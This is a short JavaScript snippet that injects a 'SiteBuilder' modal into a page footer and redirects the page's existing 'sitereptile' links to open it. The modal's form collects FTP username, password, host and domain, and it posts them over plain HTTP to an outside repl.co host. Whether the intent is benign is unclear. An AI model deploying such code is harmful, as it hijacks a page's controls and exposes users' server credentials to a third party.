document.getElementsByTagName("footer")[0].innerHTML += `
<div class="modal fade" id="sb" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title" id="myModalLabel">Entering SiteBuilder</h4>
      </div>
      <div class="modal-body">
        <form method="POST" action="http://BuildALL.imloading.repl.co">
  <label for="ftp_user">FTP Username:</label><br>
  <input class="form-control"  type="text" id="ftp_user" name="ftp_user" ><br>
  <label for="ftp_password">FTP Password:</label><br>
  <input class="form-control"  type="text" id="ftp_password" name="ftp_password" ><br><br>
    <label for="domain">Domain Name:</label><br>
  <input class="form-control" type="text" id="domain" name="domain"><br>
  <label for="ftp_host">FTP Host:</label><br>
  <input class="form-control"  type="text" id="ftp_host" name="ftp_host" ><br><br>
    <label for="builder_upload">Domain Directroy (Example: subdomain.web.net/htdocs/):</label><br>
  <input class="form-control"  type="text" id="builder_upload" name="builder_upload" ><br><br>
      <input type="submit" value="Go!" class="btn btn-primary">
      </form>

      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
    
      </div>
 
    </div>
  </div>
</div>
 `
var a = document.getElementById("icon-sitereptile")
a.setAttribute("data-toggle", "modal");
a.setAttribute("data-target", "#sb");
a.setAttribute("href", "#sb");
var b = document.getElementById("item_sitereptile")
b.setAttribute("data-toggle", "modal");
b.setAttribute("data-target", "#sb");
b.setAttribute("href", "#sb");
b.setAttribute("ng-href","#sb");
